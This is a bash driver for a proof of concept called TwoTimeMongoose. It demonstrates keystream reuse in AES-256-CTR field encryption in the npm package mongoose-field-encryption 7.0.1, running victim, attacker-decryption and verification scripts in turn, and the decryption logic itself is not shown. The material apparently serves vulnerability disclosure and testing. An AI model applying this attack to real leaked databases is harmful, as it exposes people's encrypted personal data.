#!/usr/bin/env bash
# TwoTimeMongoose — end-to-end PoC for AES-256-CTR keystream (two-time-pad) reuse in
# mongoose-field-encryption. Runs fully offline; the attacker step never sees the secret.
set -uo pipefail
cd "$(dirname "$0")"
rm -f encrypted_db.json .ground_truth.json .recovered.json

if ! node -e "require('mongoose-field-encryption')" >/dev/null 2>&1; then
  echo "[setup] installing real mongoose-field-encryption@7.0.1 (falls back to vendored copy if offline)…"
  timeout 90 npm install mongoose-field-encryption@7.0.1 --no-audit --no-fund --silent >/dev/null 2>&1 || true
fi
if node -e "require('mongoose-field-encryption')" >/dev/null 2>&1; then
  echo "[setup] using the REAL npm package mongoose-field-encryption"
else
  echo "[setup] npm unavailable — using the VENDORED verbatim copy (commit c9c0063d)"
fi

echo
echo "======================================================================"
echo " VICTIM: encrypt sensitive fields (AES-256-CTR mode) and 'leak' the DB"
echo "======================================================================"
node victim_store.js 2>/dev/null

echo
echo "======================================================================"
echo " ATTACKER: recover all plaintext from encrypted_db.json — NO secret"
echo "======================================================================"
node attacker_decrypt.js

echo
echo "======================================================================"
echo " VERIFY: attacker output vs. the library's real secret-based decryption"
echo "======================================================================"
node verify.js 2>/dev/null
